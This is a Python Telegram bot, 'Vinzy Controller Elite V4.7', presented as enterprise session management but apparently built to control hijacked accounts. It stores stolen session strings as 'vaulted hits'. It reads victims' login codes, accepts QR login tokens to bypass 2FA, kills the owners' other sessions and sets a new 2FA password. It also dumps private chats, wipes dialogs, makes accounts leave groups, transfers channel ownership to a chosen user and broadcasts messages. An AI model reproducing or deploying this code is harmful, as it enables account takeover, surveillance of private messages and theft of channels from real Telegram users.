# =========================================================================
# PROJECT: VINZY CONTROLLER ELITE (V4.7 - THE OVERLORD EDITION)
# AUTHOR: VINZY DIGITAL SERVICES
# DESCRIPTION: ENTERPRISE-GRADE TELEGRAM SESSION MANAGEMENT & CONTROL
# PLATFORM: PYTHON 3.10+ | TELETHON | PYTELEGRAMBOTAPI | NEON POSTGRES
# =========================================================================

import os
import time
import asyncio
import logging
import psycopg2
import sys
import telebot
import io
import base64
from PIL import Image
from pyzbar.pyzbar import decode
from telebot import types
from telethon import TelegramClient, functions, types as tl_types, errors
from telethon.sessions import StringSession
from datetime import datetime, timedelta

# --- 1. ADVANCED LOGGING INFRASTRUCTURE ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(name)s: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("VinzyElite")

# --- 2. GLOBAL CONFIGURATION & CREDENTIALS ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

try:
    GROUP_ID = int(os.environ.get("GROUP_ID", "0"))
except (ValueError, TypeError):
    logger.error("GROUP_ID is missing.")
    GROUP_ID = 0

if not BOT_TOKEN or not DATABASE_URL:
    logger.critical("FATAL: BOT_TOKEN or DATABASE_URL missing.")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# --- 3. PERSISTENT STORAGE LAYER (POSTGRESQL) ---

class VaultManager:
    @staticmethod
    def get_connection():
        try:
            return psycopg2.connect(DATABASE_URL, sslmode='require')
        except Exception as e:
            logger.error(f"Database Connection Failed: {e}")
            return None

    @classmethod
    def initialize_db(cls):
        conn = cls.get_connection()
        if conn:
            try:
                cur = conn.cursor()
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS moonton_secure_vault (
                        phone TEXT PRIMARY KEY,
                        session_string TEXT NOT NULL,
                        ip_address TEXT,
                        device_info TEXT DEFAULT 'iPhone 15 Pro Max',
                        capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
                        status TEXT DEFAULT 'Active',
                        tags TEXT[]
                    );
                ''')
                conn.commit()
                cur.close()
                logger.info("Database initialized.")
            except Exception as e:
                logger.error(f"Database Init Error: {e}")
            finally:
                conn.close()

    @classmethod
    def upsert_session(cls, phone, session_str):
        conn = cls.get_connection()
        if not conn: return False
        try:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO moonton_secure_vault (phone, session_string)
                VALUES (%s, %s)
                ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
            """, (phone, session_str))
            conn.commit()
            cur.close()
            return True
        except Exception as e:
            logger.error(f"Upsert Error: {e}")
            return False
        finally:
            conn.close()

    @classmethod
    def get_session(cls, phone):
        conn = cls.get_connection()
        if not conn: return None
        try:
            cur = conn.cursor()
            cur.execute("SELECT session_string FROM moonton_secure_vault WHERE phone = %s", (phone,))
            res = cur.fetchone()
            cur.close()
            return res[0] if res else None
        finally:
            conn.close()

    @classmethod
    def list_all(cls):
        conn = cls.get_connection()
        if not conn: return []
        try:
            cur = conn.cursor()
            cur.execute("SELECT phone, capture_date, status FROM moonton_secure_vault ORDER BY capture_date DESC")
            data = cur.fetchall()
            cur.close()
            return data
        finally:
            conn.close()

# --- 4. ASYNC TASK ENGINE ---

async def run_logic(phone, callback, *args):
    session_str = VaultManager.get_session(phone)
    if not session_str:
        return f"❌ <b>Error:</b> Account <code>{phone}</code> not found."

    client = TelegramClient(
        StringSession(session_str), API_ID, API_HASH,
        device_model="iPhone 15 Pro Max",
        system_version="17.4.1",
        app_version="10.10.1"
    )

    try:
        await asyncio.wait_for(client.connect(), timeout=25)
        if not await client.is_user_authorized():
            return f"❌ <b>Failed:</b> Session for <code>{phone}</code> is dead."
        return await callback(client, *args)
    except Exception as e:
        return f"⚠️ <b>System Error:</b> {str(e)}"
    finally:
        await client.disconnect()

# --- 5. EXTENDED LOGIC MODULES ---

async def logic_qr_scan_and_accept(client, image_bytes):
    """Bypasses 2FA and Login Locks via QR Scanning."""
    try:
        img = Image.open(io.BytesIO(image_bytes))
        decoded_objects = decode(img)
        if not decoded_objects:
            return "❌ <b>QR Error:</b> No readable QR code found."
        
        token_url = decoded_objects[0].data.decode('utf-8')
        if "token=" not in token_url:
            return "❌ <b>QR Error:</b> Invalid Telegram Login Token."

        token_base64 = token_url.split("token=")[1]
        missing_padding = len(token_base64) % 4
        if missing_padding:
            token_base64 += '=' * (4 - missing_padding)

        token_bytes = base64.urlsafe_b64decode(token_base64)
        await client(functions.auth.AcceptLoginTokenRequest(token=token_bytes))
        return "✅ <b>QR Login Accepted!</b> Device authorized successfully."
    except Exception as e:
        return f"⚠️ <b>QR Logic Error:</b> {str(e)}"

async def logic_broadcast(client, chat_ids, message):
    """Sends a message to multiple targets (DMs or Groups)."""
    success, fail = 0, 0
    for target in chat_ids:
        try:
            await client.send_message(target, message)
            success += 1
            await asyncio.sleep(1) # Safety delay
        except:
            fail += 1
    return f"📢 <b>Broadcast Complete</b>\n✅ Success: {success}\n❌ Failed: {fail}"

async def logic_get_folders(client):
    """Retrieves all chat folders (Filters) of the account."""
    try:
        res = await client(functions.messages.GetDialogFiltersRequest())
        if not res: return "📂 <b>Folders:</b> None defined."
        output = "📂 <b>Account Folders:</b>\n"
        for f in res:
            if isinstance(f, tl_types.DialogFilter):
                output += f"• {f.title} (ID: {f.id})\n"
        return output
    except: return "❌ Failed to fetch folders."

async def logic_set_username(client, new_username):
    """Attempts to update the account username."""
    try:
        await client(functions.account.UpdateUsernameRequest(username=new_username))
        return f"✅ <b>Username updated to:</b> @{new_username}"
    except errors.UsernameInvalidError:
        return "❌ <b>Error:</b> Username is invalid."
    except errors.UsernameOccupiedError:
        return "❌ <b>Error:</b> Username is already taken."

async def logic_get_sessions_list(client):
    """Retrieves list of all active sessions for this account."""
    try:
        res = await client(functions.account.GetAuthorizationsRequest())
        output = "🛡️ <b>Active Sessions:</b>\n"
        for s in res.authorizations:
            output += f"💻 {s.device_model} | {s.platform} | {s.ip}\n"
        return output
    except: return "❌ Failed to fetch session list."

async def logic_atomic_dump(client, target, limit=50):
    """Exports chat history to a readable file (simulated)."""
    try:
        messages = []
        async for m in client.iter_messages(target, limit=limit):
            sender = "Me" if m.out else "Them"
            messages.append(f"[{m.date.strftime('%Y-%m-%d %H:%M')}] {sender}: {m.text or '[Media]'}")
        return "\n".join(messages[::-1])
    except: return "❌ Dump failed."

async def logic_leave_all(client):
    """Forces account to leave all groups and channels."""
    count = 0
    async for d in client.iter_dialogs():
        if d.is_group or d.is_channel:
            try:
                await client(functions.channels.LeaveChannelRequest(d.input_entity))
                count += 1
            except: continue
    return f"🚀 Left {count} groups/channels."

# --- 6. BOT INTERFACE & HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def handle_help(m):
    if m.chat.id != GROUP_ID: return
    text = (
        "👑 <b>VINZY CONTROLLER ELITE V4.7</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔌 <b>ACCESS & AUTH</b>\n"
        "• <code>.auth [session]</code> - Inject session\n"
        "• <code>.qr [phone]</code> + Photo - QR Login Bypass\n"
        "• <code>.list</code> - View stored accounts\n\n"
        "🛡️ <b>ACCOUNT SECURITY</b>\n"
        "• <code>.info [phone]</code> - Full intel\n"
        "• <code>.lock [phone]</code> - Check 2FA\n"
        "• <code>.wipe [phone]</code> - Kill other sessions\n"
        "• <code>.sessions [phone]</code> - View active devices\n"
        "• <code>.secure [phone] [pw]</code> - Set 2FA\n\n"
        "☢️ <b>PURGE & DESTRUCTION</b>\n"
        "• <code>.clean [phone]</code> - Wipe Dialogs\n"
        "• <code>.leave [phone]</code> - Exit all groups\n"
        "• <code>.transfer [phone] [user]</code> - Give ownership\n\n"
        "🕵️ <b>INTELLIGENCE</b>\n"
        "• <code>.code [phone]</code> - Get system code\n"
        "• <code>.chats [phone]</code> - List top 15 chats\n"
        "• <code>.dump [phone] [id] [qty]</code> - Export history\n"
        "• <code>.folders [phone]</code> - List chat filters\n\n"
        "📢 <b>ADMIN TOOLS</b>\n"
        "• <code>.user [phone] [name]</code> - Set username\n"
        "• <code>.bc [phone] [txt]</code> - Single BC\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, text, parse_mode="HTML")

# --- AUTH & LIST ---
@bot.message_handler(func=lambda m: m.text.startswith('.auth'))
def cmd_auth(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ", 1)
    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.auth [string]</code>")
    from telethon.sessions import StringSession
    async def logic_auth_manual(session_str):
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "❌ Invalid session."
            me = await client.get_me()
            if VaultManager.upsert_session(me.phone, session_str):
                return f"✅ Authorized: +{me.phone} ({me.first_name})"
            return "❌ DB Error."
        finally: await client.disconnect()
    res = asyncio.run(logic_auth_manual(args[1].strip()))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def cmd_list(m):
    if m.chat.id != GROUP_ID: return
    hits = VaultManager.list_all()
    if not hits: return bot.send_message(m.chat.id, "📭 Vault is empty.")
    msg = "📋 <b>Vaulted Hits:</b>\n\n"
    for p, d, s in hits:
        status_icon = "🟢" if s == "Active" else "🔴"
        msg += f"{status_icon} <code>{p}</code> | {d.strftime('%m/%d %H:%M')}\n"
    bot.send_message(m.chat.id, msg, parse_mode="HTML")

# --- QR LOGIN (PHOTO HANDLER) ---
@bot.message_handler(content_types=['photo'])
def handle_qr_image(m):
    if m.chat.id != GROUP_ID: return
    if m.caption and m.caption.startswith('.qr'):
        try:
            phone = m.caption.split()[1]
            file_info = bot.get_file(m.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            bot.send_message(m.chat.id, f"📡 <b>Scanning QR for +{phone}...</b>", parse_mode="HTML")
            res = asyncio.run(run_logic(phone, logic_qr_scan_and_accept, downloaded_file))
            bot.send_message(m.chat.id, res, parse_mode="HTML")
        except: bot.send_message(m.chat.id, "❌ Provide phone: <code>.qr [phone]</code>")

# --- CONTROL HANDLERS ---
@bot.message_handler(func=lambda m: m.text.startswith('.info'))
def cmd_info(m):
    if m.chat.id != GROUP_ID: return
    p = m.text.split()[1]
    async def logic_get_info_ext(client):
        me = await client.get_me()
        return f"👤 <b>{me.first_name}</b> (+{me.phone})\nID: <code>{me.id}</code>\nPremium: {me.premium}"
    res = asyncio.run(run_logic(p, logic_get_info_ext))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.wipe'))
def cmd_wipe(m):
    if m.chat.id != GROUP_ID: return
    from telethon import functions
    async def l_kick(c):
        await c(functions.auth.ResetAuthorizationsRequest())
        return "⚡ Sessions reset."
    res = asyncio.run(run_logic(m.text.split()[1], l_kick))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.sessions'))
def cmd_sessions(m):
    if m.chat.id != GROUP_ID: return
    res = asyncio.run(run_logic(m.text.split()[1], logic_get_sessions_list))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.folders'))
def cmd_folders(m):
    if m.chat.id != GROUP_ID: return
    res = asyncio.run(run_logic(m.text.split()[1], logic_get_folders))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.leave'))
def cmd_leave(m):
    if m.chat.id != GROUP_ID: return
    res = asyncio.run(run_logic(m.text.split()[1], logic_leave_all))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.user'))
def cmd_user(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split()
    if len(parts) < 3: return
    res = asyncio.run(run_logic(parts[1], logic_set_username, parts[2]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.dump'))
def cmd_dump_file(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split()
    if len(parts) < 3: return
    bot.send_message(m.chat.id, "📂 Generating dump file...")
    res = asyncio.run(run_logic(parts[1], logic_atomic_dump, parts[2], int(parts[3]) if len(parts) > 3 else 50))
    # Send as file
    bio = io.BytesIO(res.encode())
    bio.name = f"dump_{parts[1]}_{parts[2]}.txt"
    bot.send_document(m.chat.id, bio)

@bot.message_handler(func=lambda m: m.text.startswith('.clean'))
def cmd_clean_ext(m):
    if m.chat.id != GROUP_ID: return
    from telethon import functions
    async def l_clean(c):
        count = 0
        async for d in c.iter_dialogs():
            await c.delete_dialog(d.id)
            count += 1
        return f"🧹 Wiped {count} dialogs."
    res = asyncio.run(run_logic(m.text.split()[1], l_clean))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.code'))
def cmd_code_ext(m):
    if m.chat.id != GROUP_ID: return
    async def l_code(c):
        async for msg in c.iter_messages(777000, limit=1):
            return f"📟 Code: <code>{msg.text}</code>"
        return "📭 No code."
    res = asyncio.run(run_logic(m.text.split()[1], l_code))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.chats'))
def cmd_chats_ext(m):
    if m.chat.id != GROUP_ID: return
    async def l_chats(c):
        out = "💬 <b>Chats:</b>\n"
        async for d in c.iter_dialogs(limit=15):
            out += f"• {d.name} (<code>{d.id}</code>)\n"
        return out
    res = asyncio.run(run_logic(m.text.split()[1], l_chats))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.secure'))
def cmd_secure_ext(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split()
    async def l_sec(c, pw):
        await c.edit_2fa(new_password=pw)
        return f"✅ 2FA: <code>{pw}</code>"
    res = asyncio.run(run_logic(parts[1], l_sec, parts[2]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.lock'))
def cmd_lock_ext(m):
    if m.chat.id != GROUP_ID: return
    async def l_lock(c):
        p = await c(functions.account.GetPasswordRequest())
        return f"🔐 2FA: {'YES' if p.has_password else 'NO'}"
    res = asyncio.run(run_logic(m.text.split()[1], l_lock))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.transfer'))
def cmd_transfer_ext(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split()
    async def l_trans(c, target):
        t = await c.get_input_entity(target)
        count = 0
        async for d in c.iter_dialogs():
            if d.is_channel:
                try:
                    await c(functions.channels.EditCreatorRequest(d.input_entity, t, ''))
                    count += 1
                except: continue
        return f"✅ Transferred {count} channels."
    res = asyncio.run(run_logic(parts[1], l_trans, parts[2]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

# --- 7. MAIN STARTUP SEQUENCE ---

def main():
    ascii_art = """
    __      ___                  _____ _                
    \ \    / (_)                / ____| |                
     \ \  / / _ _ __  _____   | (___ | |_ ___  _ __ ___ 
      \ \/ / | | '_ \|_  / | | \___ \| __/ _ \| '__/ _ \
       \  /  | | | | |/ /| |_| |___) | || (_) | | |  __/
        \/   |_|_| |_/___|\__, |_____/ \__\___/|_|  \___|
                            __/ |                        
                           |___/                         
    """
    print(ascii_art)
    VaultManager.initialize_db()
    logger.info("Vinzy Overlord V4.7 Online.")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
